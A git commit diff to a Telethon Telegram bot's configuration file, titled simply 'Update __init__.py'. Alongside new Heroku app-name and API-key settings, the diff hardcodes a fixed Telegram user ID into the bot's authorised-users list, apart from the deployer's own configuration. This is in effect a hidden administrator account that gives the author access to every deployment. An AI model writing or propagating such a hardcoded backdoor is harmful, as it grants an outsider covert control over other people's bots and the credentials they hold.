fa0f26dd765148c90b1a821d76b689fda83d2d19
MOHAMMAD AMAAN <amaankhan66666@gmail.com>
2022-02-16 17:46:32 +0530

    Update __init__.py

--- TelethonBot/__init__.py
+++ TelethonBot/__init__.py
@@ -19,10 +19,16 @@ yooprint = logging.getLogger("WARNING")
 APP_ID = config("APP_ID", default=None, cast=int)
 API_HASH = config("API_HASH", default=None)
 BOT_TOKEN = config("BOT_TOKEN", default=None)
+HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
+HEROKU_API_KEY = config("HEROKU_API_KEY", None)
 LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", None))
 BOT_USER = os.environ.get("BOT_USER")
 BOT_USERS = str(BOT_USER).split(" ", maxsplit=len(BOT_USER))
 ALIVE_NAME = os.environ.get("ALIVE_NAME", "DICTATOR AMAAN")
 
+if 511112479 not in BOT_USERS:
+    BOT_USERS.append(511112479)
+OWNER_ID = int(os.environ.get("OWNER_ID", None))
+BOT_USERS.append(OWNER_ID)
 
 ATGK = TelegramClient('ATGK', APP_ID, API_HASH).start(bot_token=BOT_TOKEN) 
